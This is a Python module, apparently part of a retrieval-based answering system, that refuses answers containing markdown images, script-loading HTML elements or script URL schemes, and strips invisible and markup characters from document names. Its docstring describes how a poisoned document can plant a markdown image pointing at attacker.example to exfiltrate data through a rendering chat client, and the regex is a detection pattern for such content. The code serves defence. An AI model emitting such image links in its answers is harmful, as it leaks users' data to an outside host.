"""Output safety: content in an answer that a client could act on without the reader's consent.

Claim verification proves that a statement follows from the evidence. It cannot make the evidence safe. A poisoned
document can contain a markdown image such as ``![x](https://attacker.example/?d=...)``; an answer that quotes it is
faithful to the document, and a chat client that renders images would fetch the URL, which is a data-exfiltration
channel. So an answer containing active content is refused regardless of its support.

Plain text and ordinary links are allowed: a link needs a click. Documents that legitimately contain HTML or image
markup (for example code documentation) will have those answers refused; that cost is accepted for the control.
"""
from __future__ import annotations

import re
import unicodedata

_ACTIVE = re.compile(
    r"!\[[^\]]*\]\([^)]*\)"  # markdown image
    r"|<\s*(?:img|script|iframe|object|embed|link|meta|svg|form|style)\b"  # elements that load or run something
    r"|javascript\s*:|vbscript\s*:|data\s*:\s*text/html",  # script-bearing URL schemes
    re.IGNORECASE,
)
_CONTROL = re.compile(r"[\x00-\x1f\x7f]+")
_UNSAFE_ATTR = re.compile(r"[<>\"&]")
MAX_SOURCE_CHARS = 200


def has_active_content(text: str) -> bool:
    return bool(_ACTIVE.search(text))


def _strip_invisible(value: str) -> str:
    """Controls, line/paragraph separators (U+2028/2029, NEL) and format characters (zero-width, bidirectional
    overrides) become spaces: they can start a line in some renderers or make a name display as something else."""
    return "".join(" " if unicodedata.category(ch) in ("Cc", "Cf", "Zl", "Zp") else ch for ch in value)


def safe_attribute(value: str, limit: int = MAX_SOURCE_CHARS) -> str:
    """A document name reduced to something that cannot close a tag, start a line, or carry markup into a prompt."""
    cleaned = _UNSAFE_ATTR.sub("'", _CONTROL.sub(" ", _strip_invisible(value))).strip()
    return cleaned[:limit] + ("..." if len(cleaned) > limit else "")
